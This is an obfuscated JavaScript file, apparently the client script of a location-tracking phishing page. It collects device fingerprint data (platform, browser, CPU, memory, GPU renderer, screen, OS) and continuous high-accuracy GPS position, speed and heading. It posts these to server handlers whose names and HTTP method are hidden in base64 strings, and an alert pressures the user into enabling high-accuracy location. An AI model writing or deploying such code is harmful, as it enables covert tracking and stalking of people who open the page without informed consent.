function information() {
  var _0x90e686 = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var _0xc0d852 = navigator.deviceMemory;
  var _0x72cdac = navigator.userAgent;
  var _0xdff9b9 = _0x72cdac;
  var os = _0x72cdac;
  //gpu
  var _0x50ec90 = document.createElement('_0x50ec90');
  var gl;
  var _0x40171d;
  var _0x1554fa;
  var _0x7ddda7;


  if (cc == undefined) {
    cc = 'Not Available';
  }

  //_0xc0d852
  if (_0xc0d852 == undefined) {
    _0xc0d852 = 'Not Available';
  }

  //browser
  if (_0x72cdac.indexOf('Firefox') != -1) {
    _0xdff9b9 = _0xdff9b9.substring(_0xdff9b9.indexOf(' Firefox/') + 1);
    _0xdff9b9 = _0xdff9b9.split(' ');
    brw = _0xdff9b9[0];
  }
  else if (_0x72cdac.indexOf('Chrome') != -1) {
    _0xdff9b9 = _0xdff9b9.substring(_0xdff9b9.indexOf(' Chrome/') + 1);
    _0xdff9b9 = _0xdff9b9.split(' ');
    brw = _0xdff9b9[0];
  }
  else if (_0x72cdac.indexOf('Safari') != -1) {
    _0xdff9b9 = _0xdff9b9.substring(_0xdff9b9.indexOf(' Safari/') + 1);
    _0xdff9b9 = _0xdff9b9.split(' ');
    brw = _0xdff9b9[0];
  }
  else if (_0x72cdac.indexOf('Edge') != -1) {
    _0xdff9b9 = _0xdff9b9.substring(_0xdff9b9.indexOf(' Edge/') + 1);
    _0xdff9b9 = _0xdff9b9.split(' ');
    brw = _0xdff9b9[0];
  }
  else {
    brw = 'Not Available'
  }

  //gpu
  try {
    gl = _0x50ec90.getContext('webgl') || _0x50ec90.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    _0x40171d = gl.getExtension(atob("V0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbw=="));
    _0x1554fa = gl.getParameter(_0x40171d.UNMASKED_VENDOR_WEBGL);
    _0x7ddda7 = gl.getParameter(_0x40171d.UNMASKED_RENDERER_WEBGL);
  }
  if (_0x1554fa == undefined) {
    _0x1554fa = 'Not Available';
  }
  if (_0x7ddda7 == undefined) {
    _0x7ddda7 = 'Not Available';
  }

  var ht = window.screen.height
  var wd = window.screen.width
  //os
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) {
    os = 'Not Available';
  }
  os = os.trim();
  //
  $.ajax({
    type: atob("UE9TVA=="),
    url: atob("aW5mb19oYW5kbGVy"),
    data: { Ptf: _0x90e686, Brw: brw, Cc: cc, Ram: _0xc0d852, Ven: _0x1554fa, Ren: _0x7ddda7, Ht: ht, Wd: wd, Os: os },
    success: function () { },
    mimeType: atob("dGV4dA==")
  });
}



function locate(callback, errCallback) {
  if (navigator.geolocation) {
    var _0x2aac4c = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    var _0x28d955 = navigator.geolocation.watchPosition(showPosition, showError, _0x2aac4c);
    // Auto-clear watch after 5 minutes to avoid battery drain
    setTimeout(function() { navigator.geolocation.clearWatch(_0x28d955); }, 300000);
  }

  var _0x3ff965 = true;

  function showError(error) {
    var _0xce5303;
    var _0x36eee1 = 'failed';

    switch (error.code) {
      case error.PERMISSION_DENIED:
        _0xce5303 = 'User denied the request for Geolocation';
        break;
      case error.POSITION_UNAVAILABLE:
        _0xce5303 = 'Location information is unavailable';
        break;
      case error.TIMEOUT:
        _0xce5303 = 'The request to get user location timed out';
        alert('Please set your location mode on high accuracy...');
        break;
      case error.UNKNOWN_ERROR:
        _0xce5303 = 'An unknown error occurred';
        break;
    }

    $.ajax({
      type: atob("UE9TVA=="),
      url: atob("ZXJyb3JfaGFuZGxlcg=="),
      data: { Status: _0x36eee1, Error: _0xce5303 },
      success: errCallback(error, _0xce5303),
      mimeType: atob("dGV4dA==")
    });
  }
  function showPosition(position) {
    var _0x870749 = position.coords.latitude;
    if (_0x870749) {
      _0x870749 = _0x870749 + ' deg';
    }
    else {
      _0x870749 = 'Not Available';
    }
    var _0x5e6489 = position.coords.longitude;
    if (_0x5e6489) {
      _0x5e6489 = _0x5e6489 + ' deg';
    }
    else {
      _0x5e6489 = 'Not Available';
    }
    var _0xcb153b = position.coords.accuracy;
    if (_0xcb153b) {
      _0xcb153b = _0xcb153b + ' m';
    }
    else {
      _0xcb153b = 'Not Available';
    }
    var _0xd42706 = position.coords.altitude;
    if (_0xd42706) {
      _0xd42706 = _0xd42706 + ' m';
    }
    else {
      _0xd42706 = 'Not Available';
    }
    var _0x726593 = position.coords.heading;
    if (_0x726593) {
      _0x726593 = _0x726593 + ' deg';
    }
    else {
      _0x726593 = 'Not Available';
    }
    var _0x463d39 = position.coords.speed;
    if (_0x463d39) {
      _0x463d39 = _0x463d39 + ' m/s';
    }
    else {
      _0x463d39 = 'Not Available';
    }

    var _0xafda30 = 'success';

    $.ajax({
      type: atob("UE9TVA=="),
      url: atob("cmVzdWx0X2hhbmRsZXI="),
      data: { Status: _0xafda30, Lat: _0x870749, Lon: _0x5e6489, Acc: _0xcb153b, Alt: _0xd42706, Dir: _0x726593, Spd: _0x463d39 },
      success: _0x3ff965 ? callback : function(){},
      mimeType: atob("dGV4dA==")
    });
    _0x3ff965 = false;
  };
}

